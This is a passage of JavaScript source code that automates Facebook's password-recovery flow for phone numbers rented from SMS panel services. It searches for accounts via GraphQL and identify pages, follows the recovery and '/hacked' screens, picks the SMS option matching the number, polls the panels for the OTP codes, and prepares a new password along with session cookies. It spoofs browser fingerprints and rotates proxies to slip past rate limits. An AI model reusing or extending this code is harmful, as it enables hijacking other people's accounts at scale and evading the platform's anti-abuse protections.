    return blob.includes('facebook') || /\bfb\b/.test(blob);
  });
  return fbOnly.length > 0 ? fbOnly : arr;
}

function getUnique2oo9Ranges(records, lastRange = '') {
  const fbRecords = findFacebookServices(records);
  const seen = new Set();
  const out = [];
  for (const r of fbRecords) {
    if (!r || typeof r !== 'object') continue;
    const rangeStr = String(r.range || r.range_str || r.prefix || r.code || r.country_code || r.id || '').trim();
    const sid = String(r.sid || r.service_id || r.service || r.r_id || 'facebook').trim();
    if (!rangeStr) continue;
    const cleanRange = rangeStr.replace(/\D/g, '');
    const key = `${rangeStr}|${sid}`;
    if (seen.has(key)) continue;
    seen.add(key);

    const det = cleanRange ? detectCountryFromNumber(`+${cleanRange}000000`, '880', r.country || r.country_name || '') : null;
    const [cNameMap, cIsoMap] = cleanRange ? getCountryInfo(cleanRange) : ['Unknown', '??'];
    const rawCName = String(r.country_name || r.country || r.r_label || '').trim();
    const countryName = rawCName || (det?.name && det.name !== 'Unknown' ? det.name : cNameMap !== 'Unknown' ? cNameMap : rangeStr);
    const countryIso = (det?.iso && det.iso !== '??' ? det.iso : null) ||
      (cIsoMap && cIsoMap !== '??' ? cIsoMap : countryNameToIso(countryName)) ||
      '??';
    out.push({
      id: rangeStr,
      range: rangeStr,
      clean_range: cleanRange,
      sid,
      countryName,
      countryIso,
      flag: isoToFlag(countryIso),
      count: r.count ?? r.available ?? r.total ?? null,
      isLast: Boolean(lastRange && lastRange === rangeStr),
    });
  }
  out.sort((a, b) => (a.isLast === b.isLast ? a.countryName.localeCompare(b.countryName) : a.isLast ? -1 : 1));
  return out;
}

const two09LiveAccessCache = new Map(); // cacheKey -> { ts, res, inflight }

async function fetch2oo9LiveAccess(keys, customBaseUrl = '', forceFresh = false) {
  const cacheKey = `${Array.isArray(keys) ? keys.join(',') : String(keys || '')}|${customBaseUrl || ''}`;
  const cached = two09LiveAccessCache.get(cacheKey);
  const now = Date.now();
  if (!forceFresh && cached?.res && cached.res.ok && now - cached.ts < 45000) {
    return cached.res;
  }
  if (!forceFresh && cached?.inflight) {
    return cached.inflight;
  }
  const promise = (async () => {
    const res = await hbx2oo9Request('/liveaccess', keys, {}, 9500, customBaseUrl);
    let out;
    if (!res.ok) {
      out = { ok: false, error: res.error, records: [] };
    } else {
      const d = res.data;
      const records = Array.isArray(d)
        ? d
        : (d?.data || d?.services || d?.fb_services || d?.records || d?.ranges || d?.items || []);
      out = { ok: true, usedKey: res.usedKey, records: Array.isArray(records) ? records : [] };
    }
    two09LiveAccessCache.set(cacheKey, { ts: Date.now(), res: out, inflight: null });
    return out;
  })();
  two09LiveAccessCache.set(cacheKey, { ts: cached?.ts || 0, res: cached?.res || null, inflight: promise });
  return promise;
}

async function fetch2oo9LiveNumber(keys, rangeStr = '', sid = '', customBaseUrl = '') {
  const params = {};
  if (rangeStr) params.range = rangeStr;
  if (sid) params.sid = sid;
  const res = await hbx2oo9Request('/getnum', keys, params, 8500, customBaseUrl);
  if (!res.ok) return { ok: false, error: res.error, number: '' };
  const d = res.data;
  let rawNum = '';
  if (typeof d === 'string') {
    rawNum = d;
  } else if (Array.isArray(d) && d.length > 0) {
    const first = d[0];
    rawNum = typeof first === 'object' ? (first.number || first.phone || first.full_number || first.phone_number || '') : String(first);
  } else if (d && typeof d === 'object') {
    const nested = d.data || d.num_data || d.result || d.records?.[0] || d;
    if (Array.isArray(nested) && nested.length > 0) {
      const f = nested[0];
      rawNum = typeof f === 'object' ? (f.number || f.phone || f.full_number || f.phone_number || '') : String(f);
    } else if (nested && typeof nested === 'object') {
      rawNum = nested.number || nested.phone || nested.full_number || nested.phone_number || d.number || d.phone || '';
    } else {
      rawNum = String(d.number || d.phone || d.full_number || '');
    }
  }
  const clean = String(rawNum || '').replace(/\D/g, '');
  const apiErr = (d && typeof d === 'object' && !Array.isArray(d)) ? String(d.error || d.message || '').trim() : '';
  return clean ? { ok: true, number: clean, raw: d } : { ok: false, error: apiErr || 'API returned no number', number: '' };
}

const two09OtpPollCache = new Map(); // cacheKey -> { ts, res, inflight }

async function fetch2oo9SuccessOtps(keys, customBaseUrl = '', forceFresh = false) {
  const cacheKey = `${Array.isArray(keys) ? keys.join(',') : String(keys || '')}|${customBaseUrl || ''}`;
  const entry = two09OtpPollCache.get(cacheKey);
  const now = Date.now();
  if (!forceFresh && entry?.res && now - entry.ts < 900) {
    return entry.res;
  }
  if (entry?.inflight) {
    return entry.inflight;
  }
  const promise = (async () => {
    const res = await hbx2oo9Request('/success-otp', keys, {}, 8000, customBaseUrl);
    let out;
    if (!res.ok) {
      out = { ok: false, error: res.error, otps: [] };
    } else {
      const d = res.data;
      const rawList = Array.isArray(d)
        ? d
        : (d?.data || d?.otps || d?.otp_data || d?.recent_success_otps || d?.records || d?.messages || []);
      const list = [];
      if (Array.isArray(rawList)) {
        for (const row of rawList) {
          if (!row || typeof row !== 'object') continue;
          const number = String(row.number || row.phone || row.phone_number || row.msisdn || '').replace(/\D/g, '');
          const message = String(row.message || row.sms || row.text || row.msg || row.body || row.otp || row.code || '').trim();
          const sender = sanitizeProviderText(String(row.sender || row.sid || row.cli || row.service || 'LOL-Server').trim()) || 'LOL-Server';
          const ts = String(row.time || row.created_at || row.createdAt || row.saved_at || '').trim();
          const code = extractFbOtpFromSms(message) || String(row.otp || row.code || '').replace(/\D/g, '');
          const id = String(row.id || row._id || `${number}_${ts}_${message.slice(0, 16)}`);
          if (number && (message || code)) {
            list.push({ id, number, sender, message: message || `OTP: ${code}`, code, ts });
          }
        }
      }
      out = { ok: true, otps: list };
    }
    two09OtpPollCache.set(cacheKey, { ts: Date.now(), res: out, inflight: null });
    return out;
  })();
  two09OtpPollCache.set(cacheKey, { ts: entry?.ts || 0, res: entry?.res || null, inflight: promise });
  return promise;
}

async function checkHbxRemoteStatus(keys, lamixTok = '', customBaseUrl = '') {
  let remoteOn = null;
  let remoteRaw = '';
  let remoteErr = '';
  const checkRemoteP = (async () => {
    try {
      const ctrl = new AbortController();
      const t = setTimeout(() => ctrl.abort(), 7000);
      const r = await fetch(HBX_REMOTE_STATUS_URL, {
        headers: { 'User-Agent': DESKTOP_UA },
        signal: ctrl.signal,
      });
      clearTimeout(t);
      remoteRaw = (await r.text()).trim();
      const low = remoteRaw.toLowerCase();
      remoteOn = r.ok && (low === 'on' || low === 'true' || low === '1' || low === 'active' || low === 'enabled');
    } catch (err) {
      remoteOn = false;
      remoteErr = err instanceof Error ? err.message : 'Status check failed';
    }
  })();

  const [, two09Res, lamixStatus] = await Promise.all([
    checkRemoteP,
    fetch2oo9LiveAccess(keys, customBaseUrl),
    lamixTok ? checkLamixStatus(lamixTok) : Promise.resolve(null),
  ]);
  const ranges2oo9 = two09Res.ok ? getUnique2oo9Ranges(two09Res.records) : [];
  const activePanelsCnt = readPanelsStore().panels.filter((p) => p.active !== false).length;

  return {
    remoteOn,
    remoteRaw: remoteRaw.slice(0, 60),
    remoteErr,
    api2oo9Ok: two09Res.ok,
    api2oo9Err: two09Res.error || '',
    api2oo9RangesCount: ranges2oo9.length,
    lamixOk: lamixStatus ? lamixStatus.ok : null,
    lamixErr: lamixStatus ? lamixStatus.error : '',
    lamixRangesCount: lamixStatus ? lamixStatus.rangesCount : 0,
    activePanelsCnt,
  };
}

function pickSmsRecoverChoice(html, phone = '') {
  const src = String(html || '');
  const formBlocks = src.match(/<form\b[^>]*>[\s\S]*?<\/form>/gi) || [];
  let chosenFormHtml = '';
  for (const blk of formBlocks) {
    if (/name=["']recover_method["']/i.test(blk) || /\/recover\/initiate/i.test(blk)) {
      chosenFormHtml = blk;
      break;
    }
  }
  const form = chosenFormHtml ? readForm(chosenFormHtml, 'otp') : readForm(src, 'otp');
  const fields = Object.fromEntries(Object.entries(form.inputs || {}).map(([k, v]) => [k, v[1]]));

  // Never treat a password login form without recover_method radios as an SMS initiate choice
  const hasMethodRadio = /name=["']recover_method["']/i.test(chosenFormHtml || src);
  if ('pass' in fields && !hasMethodRadio && !/\/recover\/initiate/i.test(form.action || '')) {
    return { action: '', fields: {}, hasSmsRadio: false, radios: [] };
  }

  const labelMap = {};
  for (const lm of (chosenFormHtml || src).matchAll(/<label\b[^>]*for=["']([^"']+)["'][^>]*>([\s\S]*?)<\/label>/gi)) {
    labelMap[decodeHtmlAttrs(lm[1])] = decodeHtmlAttrs(lm[2].replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim());
  }

  const radios = [];
  for (const tag of (chosenFormHtml || src).match(/<input\b[^>]*type=["']radio["'][^>]*>/gi) || []) {
    const nM = tag.match(/name=["']([^"']+)["']/i);
    const vM = tag.match(/value=["']([^"']*)["']/i);
    const idM = tag.match(/id=["']([^"']+)["']/i);
    if (nM && vM) {
      const id = idM ? decodeHtmlAttrs(idM[1]) : '';
      radios.push({
        name: decodeHtmlAttrs(nM[1]),
        value: decodeHtmlAttrs(vM[1]),
        label: (id && labelMap[id]) || '',
      });
    }
  }

  const smsRadios = radios.filter(
    (r) => /send_sms|sms|mobile|phone|text|\+\d{1,4}|\*{2,}/i.test(`${r.value} ${r.label}`) && !/whatsapp|call|voice|email|password/i.test(`${r.value} ${r.label}`)
  );
  const phoneDigits = String(phone || '').replace(/\D/g, '');
  const tail2 = phoneDigits.length >= 2 ? phoneDigits.slice(-2) : '';
  const tail4 = phoneDigits.length >= 4 ? phoneDigits.slice(-4) : '';
  const smsRadio =
    (tail4 && smsRadios.find((r) => r.label.replace(/\D/g, '').endsWith(tail4))) ||
    (tail2 && smsRadios.find((r) => r.label.replace(/\D/g, '').endsWith(tail2))) ||
    smsRadios.find((r) => /send_sms|sms|text/i.test(`${r.value} ${r.label}`)) ||
    smsRadios[0] ||
    null;

  if (smsRadio) fields[smsRadio.name] = smsRadio.value;
  if (!('reset_action' in fields) && /name=["']reset_action["']/i.test(chosenFormHtml || src)) {
    fields.reset_action = 'Continue';
  }
  const lsd = fields.lsd || tok(src, 'lsd');
  if (lsd) {
    fields.lsd = lsd;
    fields.jazoest = fields.jazoest || tok(src, 'jazoest') || jazoest(lsd);
  }
  return { action: form.action || '', fields, hasSmsRadio: Boolean(smsRadio), radios };
}

async function triggerForgotPasswordOtp(phone, cfg, proxy, opts = {}) {
  const isFastOtp = Boolean(opts.fastMode || (cfg.hbx_mode && !cfg.human_delay));
  const timeoutMs = isFastOtp
    ? Math.max(9500, Math.min(13000, (cfg.timeout || 14) * 1000))
    : Math.max(12000, ((cfg.timeout || 22) + 4) * 1000);
  const strictProxy = cfg.strict_proxy !== false;
  const resendTarget = Math.max(1, Math.min(12, Number(opts.resends ?? cfg.pc_otp_resends ?? 3)));
  const fp = buildFingerprint(opts.cc || cfg.cc);
  const resetJarForFreshNumber = () => {
    for (const k of Object.keys(jar)) delete jar[k];
    if (cfg.fresh_id !== false) {
      jar.wd = `${fp.sw}x${fp.sh}`;
      jar.m_pixel_ratio = String(fp.dpr);
    }
  };
  const useFreshJar = opts.freshCookies !== false;
  const jar = (!useFreshJar && opts.gqlJar && typeof opts.gqlJar === 'object') ? { ...opts.gqlJar } : {};
  if (cfg.fresh_id !== false) {
    jar.wd = `${fp.sw}x${fp.sh}`;
    jar.m_pixel_ratio = String(fp.dpr);
  }
  let px = proxy || cfg.proxy || null;
  const mobileUa = fp.ua || LITE_UA;
  const trace = [];

  const isDesktopUrl = (u) => {
    try {
      const h = new URL(u).hostname.toLowerCase();
      return h === 'www.facebook.com' || h === 'web.facebook.com' || h === 'facebook.com';
    } catch {
      return false;
    }
  };

  const uaForUrl = (u) => (isDesktopUrl(u) ? DESKTOP_UA : mobileUa);

  const headersForUrl = (u, extra = {}) => {
    if (isDesktopUrl(u)) {
      return {
        'User-Agent': DESKTOP_UA,
        Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': fp.headers['Accept-Language'] || 'en-US,en;q=0.9',
        'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Google Chrome";v="131"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-dest': 'document',
        'upgrade-insecure-requests': '1',
        ...extra,
      };
    }
    return {
      ...fp.headers,
      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-dest': 'document',
      'upgrade-insecure-requests': '1',
      ...extra,
    };
  };

  const safeFetch = async (url, fOpts = {}) => {
    const reqUa = fOpts.ua || uaForUrl(url);
    try {
      return await fetchWithJar(url, jar, {
        preferCurl: true,
        ...fOpts,
        timeoutMs,
        proxy: px,
        strictProxy,
        ua: reqUa,
        shouldAbort: opts.shouldAbort,
      });
    } catch (err) {
      if (err && err.isProxyError && /407/.test(err.message || '') && opts.rawProxy && px !== opts.rawProxy) {
        dynamicProxyTagBlacklist.add(proxyHealthKey(opts.rawProxy));
        px = opts.rawProxy;
        return await fetchWithJar(url, jar, {
          preferCurl: true,
          ...fOpts,
          timeoutMs,
          proxy: px,
          strictProxy,
          ua: reqUa,
          shouldAbort: opts.shouldAbort,
        });
      }
      throw err;
    }
  };

  const hasIdentifySearchForm = (html, url) => {
    const f = readForm(html, 'reg');
    const keys = Object.keys(f.inputs || {});
    if (!keys.includes('email')) return false;
    const isPasswordLoginForm = keys.includes('pass') && !/\/login\/identify|\/recover|\/hacked/i.test(url || '');
    return !isPasswordLoginForm;
  };

  const isCodeInputPage = (html, url) =>
    OTP_FIELDS.some((k) => new RegExp(`name=["']${k}["']`, 'i').test(html || '')) || /\/recover\/code/i.test(url || '');

  const phoneDigitsAll = String(phone || '').replace(/\D/g, '');
  const cleanPhoneTail2 = phoneDigitsAll.slice(-2);
  const cleanPhoneTail4 = phoneDigitsAll.slice(-4);

  const resolveRecoverySurface = async (startHtml, startUrl) => {
    let h = String(startHtml || '');
    let u = String(startUrl || '');
    const visited = new Set([u]);
    for (let hop = 0; hop < 6; hop++) {
      if (opts.shouldAbort && opts.shouldAbort()) break;
      if (isCodeInputPage(h, u)) break;
      const pick = pickSmsRecoverChoice(h, phone);
      if (pick.hasSmsRadio || (/\/recover\/initiate/i.test(u) && /recover_method/i.test(h))) break;

      const sig = extractFbResponseSignals(h);
      const bodySrc = sig.decodedHtml || h;
      const bodyNoScript = bodySrc.replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '');

      // 1) "Choose your account" list with cuid_selected= or /login/device-based/ar/login/ or /recover/select
      const anchorMatches = [];
      for (const m of bodyNoScript.matchAll(/<a\b[^>]*href=["']([^"']*(?:cuid_selected=|\/login\/device-based\/ar\/login\/|\/recover\/(?:initiate|select))[^"']*)["'][^>]*>([\s\S]*?)<\/a>/gi)) {
        const href = decodeHtmlAttrs(m[1]);
        if (/\/login\/\?next=|cancel/i.test(href)) continue;
        const label = decodeHtmlAttrs(m[2].replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim());
        anchorMatches.push({ href, label });
      }
      const directInitiateLink = anchorMatches.find((a) => /\/recover\/initiate/i.test(a.href))?.href;
      const cuidMatchObj =
        (cleanPhoneTail4 && anchorMatches.find((a) => a.label.replace(/\D/g, '').endsWith(cleanPhoneTail4))) ||
        (cleanPhoneTail2 && anchorMatches.find((a) => a.label.replace(/\D/g, '').endsWith(cleanPhoneTail2))) ||
        anchorMatches.find((a) => /cuid_selected=|device-based\/ar/i.test(a.href)) ||
        (directInitiateLink ? { href: directInitiateLink } : null);

      if (cuidMatchObj?.href && (!hasIdentifySearchForm(h, u) || /cuid_selected=|account_recovery\/name_search|\/recover\/initiate/i.test(cuidMatchObj.href))) {
        const nextU = new URL(cuidMatchObj.href, u).toString();
        if (nextU !== u && !visited.has(nextU)) {
          visited.add(nextU);
          try {
            const rHop = await safeFetch(nextU, { headers: headersForUrl(nextU, { Referer: u }) });
            if (rHop.status < 400 && (rHop.text || '').length > 180) {
              u = rHop.url || nextU;
              h = rHop.text || h;
              trace.push(`hop->${u.split('?')[0].slice(-20)}`);
              continue;
            }
          } catch (err) {
            if (err && err.isProxyError) throw err;
          }
        }
      }

      // 2) "Try entering your password" screen (/login/account_recovery/name_search/) -> follow "Try another way"
      if (/account_recovery\/name_search/i.test(u) || (/name=["']pass["']/i.test(bodyNoScript) && !/name=["']recover_method["']/i.test(bodyNoScript))) {
        const tryM = bodyNoScript.match(/<a\b[^>]*href=["']([^"']*\/recover\/initiate[^"']*)["']/i);
        if (tryM && tryM[1]) {
          const nextU = new URL(decodeHtmlAttrs(tryM[1]), u).toString();
          if (!visited.has(nextU)) {
            visited.add(nextU);
            try {
              const rHop = await safeFetch(nextU, { headers: headersForUrl(nextU, { Referer: u }) });
              if (rHop.status < 400 && (rHop.text || '').length > 180) {
                u = rHop.url || nextU;
                h = rHop.text || h;
                trace.push(`try-other(${rHop.status})`);
                continue;
              }
            } catch (err) {
              if (err && err.isProxyError) throw err;
            }
          }
        }
      }

      // 3) AJAX / BigPipe redirectUris pointing to /recover/
      const redir = (sig.redirectUris || []).find((ru) => /\/recover\/(?:initiate|code)/i.test(ru));
      if (redir) {
        const nextU = new URL(redir, u).toString();
        if (nextU !== u && !visited.has(nextU)) {
          visited.add(nextU);
          try {
            const rHop = await safeFetch(nextU, { headers: headersForUrl(nextU, { Referer: u }) });
            if (rHop.status < 400 && (rHop.text || '').length > 180) {
              u = rHop.url || nextU;
              h = rHop.text || h;
              trace.push(`redir->${u.split('?')[0].slice(-18)}`);
              continue;
            }
          } catch (err) {
            if (err && err.isProxyError) throw err;
          }
        }
      }
      break;
    }
    return { html: h, url: u };
  };

  let curUrl = '';
  let curHtml = '';
  let usedEntryUrl = '';
  let activeUa = mobileUa;
  let searchSettled = false;

  // Layer 0: Universal GraphQL Recovery Locator (CAAFBAccountSearchViewQuery -> redirect_uri -> limited.facebook.com)
  let gqlRedirectUri = String(opts.gqlRedirectUri || '').trim();
  if (!gqlRedirectUri && !opts.skipGqlLookup) {
    try {
      const gqlLive = await checkNumberGraphql(`+${phone}`, {
        cc: opts.cc || cfg.cc,
        proxy: px,
        strictProxy,
        forceRefreshSession: true,
        timeoutMs: Math.min(timeoutMs, 14000),
        shouldAbort: opts.shouldAbort,
      });
      if (gqlLive.status === 'free' && !opts.assumeExists) {
        return { ok: false, notFound: true, usedEntryUrl: 'graphql', err: 'Facebook reported no account for this number', trace: ['gql:free'] };
      }
      if (gqlLive.status === 'free') {
        trace.push('gql:free->ssr');
      }
      if (gqlLive.redirectUri) {
        gqlRedirectUri = gqlLive.redirectUri;
        if (gqlLive.gqlJar && Object.keys(jar).length <= 2) {
          Object.assign(jar, gqlLive.gqlJar);
        }
      }
      trace.push(`gql:${gqlLive.status}`);
    } catch (err) {
      if (err && err.isProxyError) throw err;
      trace.push('gql:err');
    }
  } else if (gqlRedirectUri) {
    trace.push('gql:prehit');
  } else {
    trace.push('gql:skip');
  }

  if (gqlRedirectUri) {
    for (const rHost of ['https://limited.facebook.com', 'https://m.facebook.com']) {
      if (opts.shouldAbort && opts.shouldAbort()) return { ok: false, aborted: true };
      const targetUrl = new URL(gqlRedirectUri, rHost).toString();
      try {
        const rInit = await safeFetch(targetUrl, {
          headers: headersForUrl(targetUrl, { Referer: `${rHost}/login/identify/` }),
        });
        if (rInit.status < 400 && (rInit.text || '').length > 180) {
          const resolved = await resolveRecoverySurface(rInit.text || '', rInit.url || targetUrl);
          const pickCheck = pickSmsRecoverChoice(resolved.html, phone);
          if (isCodeInputPage(resolved.html, resolved.url) || pickCheck.hasSmsRadio || /\/recover\/initiate/i.test(resolved.url)) {
            curUrl = resolved.url;
            curHtml = resolved.html;
            usedEntryUrl = `${rHost}/login/identify/?ctx=recover`;
            activeUa = uaForUrl(curUrl);
            searchSettled = true;
            trace.push(`ci->${new URL(rHost).hostname.split('.')[0]}`);
            break;
          }
        }
      } catch (err) {
        if (err && err.isProxyError) throw err;
      }
    }
  }

  // Layer 1: Classic SSR Identify Entry Fallback (always wipe stale cookies before fresh identify search)
  if (!searchSettled) {
    resetJarForFreshNumber();
    const userEntries = normalizePcRecoveryUrls(opts.recoveryUrls || cfg.pc_recovery_urls, { fallbackToDefaults: true });
    const priorityEntries = [
      'https://limited.facebook.com/login/identify/?ctx=recover',
      'https://limited.facebook.com/login/',
      'https://m.facebook.com/login/identify/?ctx=recover&ars=facebook_login',
      'https://mbasic.facebook.com/login/identify/?ctx=recover',
    ];
    const candidateEntries = Array.from(
      new Set([
        ...userEntries.filter((u) => /limited\.facebook\.com/i.test(u)),
        'https://limited.facebook.com/login/identify/?ctx=recover',
        ...userEntries,
        ...priorityEntries,
      ])
    );

    for (const entryUrl of candidateEntries) {
      if (opts.shouldAbort && opts.shouldAbort()) return { ok: false, aborted: true };
      resetJarForFreshNumber();
      let eUrl = entryUrl;
      let eHtml = '';
      const entryOrigin = new URL(entryUrl).origin;

      try {
        const r0 = await safeFetch(entryUrl, {
          headers: headersForUrl(entryUrl, { Referer: `${entryOrigin}/`, 'sec-fetch-site': 'none' }),
        });
        if (r0.status >= 400 || (r0.text || '').length < 180) {
          trace.push(`entry(${new URL(entryUrl).hostname}:${r0.status})`);
          continue;
        }
        eUrl = r0.url || entryUrl;
        eHtml = r0.text || '';
        trace.push(`entry(${new URL(entryUrl).hostname}${new URL(entryUrl).pathname.slice(0, 16)}:${r0.status})`);
      } catch (err) {
        if (err && err.isProxyError) throw err;
        trace.push('entry-err');
        continue;
      }

      if (!hasIdentifySearchForm(eHtml, eUrl)) {
        const linkMatch =
          eHtml.match(/href=["']([^"']*\/login\/identify[^"']*)["']/i) ||
          eHtml.match(/href=["']([^"']*\/recover\/initiate[^"']*)["']/i) ||
          eHtml.match(/href=["']([^"']*\/hacked\/(?:support|compromised|recover)[^"']*)["']/i);
        const nextIdentifyUrl = linkMatch?.[1]
          ? new URL(decodeHtmlAttrs(linkMatch[1]), eUrl).toString()
          : `${new URL(eUrl).origin}/login/identify/?ctx=recover&ars=facebook_login`;

        try {
          const rNext = await safeFetch(nextIdentifyUrl, {
            headers: headersForUrl(nextIdentifyUrl, { Referer: eUrl }),
          });
          if (rNext.status < 400 && (rNext.text || '').length > 180) {
            eUrl = rNext.url || nextIdentifyUrl;
            eHtml = rNext.text || '';
            trace.push(`hop-id(${rNext.status})`);
          }
        } catch (err) {
          if (err && err.isProxyError) throw err;
        }

        if (!hasIdentifySearchForm(eHtml, eUrl) && /\/hacked/i.test(eUrl)) {
          const hForm = readForm(eHtml, 'reg');
          if (hForm.action && /\/hacked|\/login\/identify|\/recover/i.test(hForm.action)) {
            try {
              const hAct = new URL(hForm.action, eUrl).toString();
              const hFields = Object.fromEntries(Object.entries(hForm.inputs || {}).map(([k, v]) => [k, v[1]]));
              const rHack = await safeFetch(hAct, {
                method: 'POST',
                body: new URLSearchParams(hFields).toString(),
                headers: headersForUrl(hAct, {
                  Referer: eUrl,
                  Origin: new URL(hAct).origin,
                  'Content-Type': 'application/x-www-form-urlencoded',
                }),
              });
              if (rHack.status < 400 && (rHack.text || '').length > 180) {
                eUrl = rHack.url || hAct;
                eHtml = rHack.text || '';
                trace.push(`hack-post(${rHack.status})`);
              }
            } catch (err) {
              if (err && err.isProxyError) throw err;
            }
          }
        }
      }

      if (!hasIdentifySearchForm(eHtml, eUrl)) {
        trace.push(`no-id-form(${new URL(eUrl).hostname})`);
        continue;
      }

      // Step 1: Submit phone search on the resolved identify form
      const idForm = readForm(eHtml, 'reg');
      const idFields = Object.fromEntries(Object.entries(idForm.inputs || {}).map(([k, v]) => [k, v[1]]));
      const lsd = idFields.lsd || tok(eHtml, 'lsd');
      if (lsd) {
        idFields.lsd = lsd;
        idFields.jazoest = idFields.jazoest || tok(eHtml, 'jazoest') || jazoest(lsd);
      }
      idFields.email = `+${phone}`;
      if (!('did_submit' in idFields)) idFields.did_submit = 'Search';

      const idAct = idForm.action
        ? new URL(idForm.action, eUrl).toString()
        : `${new URL(eUrl).origin}/login/identify/?ctx=recover`;
      let rSearch;
      try {
        rSearch = await safeFetch(idAct, {
          method: 'POST',
          body: new URLSearchParams(idFields).toString(),
          headers: headersForUrl(idAct, {
            Referer: eUrl,
            Origin: new URL(idAct).origin,
            'Content-Type': 'application/x-www-form-urlencoded',
          }),
        });
      } catch (err) {
        if (err && err.isProxyError) throw err;
        trace.push('search-err');
        continue;
      }

      curUrl = rSearch.url || idAct;
      curHtml = rSearch.text || '';
      usedEntryUrl = entryUrl;
      activeUa = uaForUrl(curUrl);
      trace.push(`search ${rSearch.status} -> ${curUrl.split('?')[0].slice(-26)}`);

      const sig1 = extractFbResponseSignals(curHtml);
      const vis1 = `${sig1.visibleText} ${sig1.errTexts.join(' ')}`.toLowerCase();
      if (/temporarily blocked|going too fast|misusing this feature|try again later|too many attempts/i.test(vis1)) {
        return { ok: false, rateLimited: true, usedEntryUrl, err: 'Facebook rate limit: going too fast', trace };
      }
      if (GQL_NO_ACCOUNT_PATTERNS.some((p) => vis1.includes(p)) || vis1.includes('no search results')) {
        return { ok: false, notFound: true, usedEntryUrl, err: 'Facebook reported no account for this number', trace };
      }

      const resolved = await resolveRecoverySurface(curHtml, curUrl);
      curHtml = resolved.html;
      curUrl = resolved.url;
      activeUa = uaForUrl(curUrl);

      const pickCheck = pickSmsRecoverChoice(curHtml, phone);
      if (isCodeInputPage(curHtml, curUrl) || pickCheck.hasSmsRadio || /\/recover\/initiate/i.test(curUrl)) {
        searchSettled = true;
        break;
      }

      trace.push(`non-ssr(${new URL(curUrl).hostname})`);
    }
  }

  if (!searchSettled || !curHtml) {
    return { ok: false, err: 'Could not open Facebook recovery OTP page via configured links', usedEntryUrl, trace };
  }

  const pxPool = Array.isArray(opts.proxiesPool) ? opts.proxiesPool : [];
  const badPxSet = opts.badProxies || new Set();
  const rotatePerRound = opts.rotateProxyPerRound !== false;
  const targetIsoForPx = String(opts.iso || '').trim().toUpperCase();
  const rotateFreshRecoveryProxy = (roundSeed = 0) => {
    const rawCandidate = pxPool.length > 0
      ? selectSmartProxy(pxPool, roundSeed, badPxSet, 'rotate', opts.rawProxy || cfg.proxy || px || null, targetIsoForPx)
      : (opts.rawProxy || cfg.proxy || px || null);
    if (!rawCandidate) return px;
    const adapted = adaptProxyForSession(rawCandidate, {
      iso: targetIsoForPx,
      autoCountry: cfg.auto_proxy_country !== false,
      refreshSession: true,
      forcedSessionId: crypto.randomBytes(6).toString('hex'),
    });
    return adapted.url || rawCandidate;
  };

  let otpsSent = 0;
  let lastMethod = '';
  let rateLimited = false;

  const itemStub = {
    status: 'CONFIRM',
    flow: 'recovery',
    phone,
    name: opts.nameHint || `FB User +${phone.slice(-4)}`,
    pass: opts.newPass || cfg.password || '',
    uid: extractUidFromHtml(curHtml, curUrl) || '',
    cookies: orderCookies(jar),
    confirm_url: curUrl,
    proxy: px || '',
    rawProxy: opts.rawProxy || px || '',
    ua: activeUa,
    iso: opts.iso || '',
    country: opts.country || '',
    usedEntryUrl,
    resendCount: 0,
    _lastConfirmHtml: curHtml,
  };

  const syncStubState = () => {
    const uFound = extractUidFromHtml(curHtml, curUrl);
    if (uFound && !itemStub.uid) itemStub.uid = uFound;
    itemStub.cookies = orderCookies(jar);
    itemStub.confirm_url = curUrl;
    itemStub.proxy = px || itemStub.proxy || '';
    itemStub.ua = uaForUrl(curUrl);
    itemStub.resendCount = otpsSent;
    itemStub._lastConfirmHtml = curHtml;
    const pf = readForm(curHtml, 'otp');
    if (pf.action) {
      itemStub.action = pf.action;
      itemStub.fields = Object.fromEntries(Object.entries(pf.inputs || {}).map(([k, v]) => [k, v[1]]));
    }
  };

  const reEnterCleanRecoverySms = async (seedOffset = 0) => {
    resetJarForFreshNumber();
    const nextPx = rotateFreshRecoveryProxy(seedOffset);
    if (nextPx) px = nextPx;
    const freshEntries = Array.from(
      new Set([
        'https://limited.facebook.com/login/identify/?ctx=recover',
        'https://m.facebook.com/login/identify/?ctx=recover&ars=facebook_login',
        'https://mbasic.facebook.com/login/identify/?ctx=recover',
      ])
    );
    for (const entryUrl of freshEntries) {
      if (opts.shouldAbort && opts.shouldAbort()) break;
      try {
        const r0 = await safeFetch(entryUrl, {
          headers: headersForUrl(entryUrl, { Referer: `${new URL(entryUrl).origin}/`, 'sec-fetch-site': 'none' }),
        });
        if (r0.status >= 400 || (r0.text || '').length < 180) continue;
        let eUrl = r0.url || entryUrl;
        let eHtml = r0.text || '';
        if (!hasIdentifySearchForm(eHtml, eUrl)) continue;
        const idForm = readForm(eHtml, 'reg');
        const idFields = Object.fromEntries(Object.entries(idForm.inputs || {}).map(([k, v]) => [k, v[1]]));
        const lsdVal = idFields.lsd || tok(eHtml, 'lsd');
        if (lsdVal) {
          idFields.lsd = lsdVal;
          idFields.jazoest = idFields.jazoest || tok(eHtml, 'jazoest') || jazoest(lsdVal);
        }
        idFields.email = `+${phone}`;
        if (!('did_submit' in idFields)) idFields.did_submit = 'Search';
        const idAct = idForm.action ? new URL(idForm.action, eUrl).toString() : `${new URL(eUrl).origin}/login/identify/?ctx=recover`;
        const rSearch = await safeFetch(idAct, {
          method: 'POST',
          body: new URLSearchParams(idFields).toString(),
          headers: headersForUrl(idAct, {
            Referer: eUrl,
            Origin: new URL(idAct).origin,
            'Content-Type': 'application/x-www-form-urlencoded',
          }),
        });
        const resolved = await resolveRecoverySurface(rSearch.text || '', rSearch.url || idAct);
        curUrl = resolved.url;
        curHtml = resolved.html;
        if (isCodeInputPage(curHtml, curUrl) && !isNonSmsDeliveryScreen(extractFbResponseSignals(curHtml).visibleText.toLowerCase())) {
          return true;
        }
        const pick = pickSmsRecoverChoice(curHtml, phone);
        if (pick.action) {
          const postUrl = new URL(pick.action, curUrl).toString();
